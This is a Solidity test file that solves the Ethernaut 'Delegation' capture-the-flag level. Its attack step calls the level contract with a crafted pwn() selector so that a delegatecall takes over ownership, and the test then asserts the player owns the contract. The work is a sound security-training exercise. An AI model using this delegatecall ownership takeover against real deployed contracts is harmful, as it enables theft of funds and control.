// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {BaseTest} from "./BaseTest.t.sol";
import {DelegationFactory} from "../src/Delegation/DelegationFactory.sol";
import {Delegation} from "../src/Delegation/Delegation.sol";

contract DelegationTest is BaseTest {
    function testDelegationHack() public {
        ////////////////////*/
        //    Level Setup
        ////////////////////*/
        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        ////////////////////*/
        //   Level Attack
        ////////////////////*/
        (bool success,) = address(ethernautDelegation).call(abi.encodeWithSignature("pwn()"));
        assertTrue(success);
        assertEq(ethernautDelegation.owner(), player);

        //////////////////////*/
        //  Level Submission
        //////////////////////*/
        bool levelCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assertTrue(levelCompleted);
    }
}
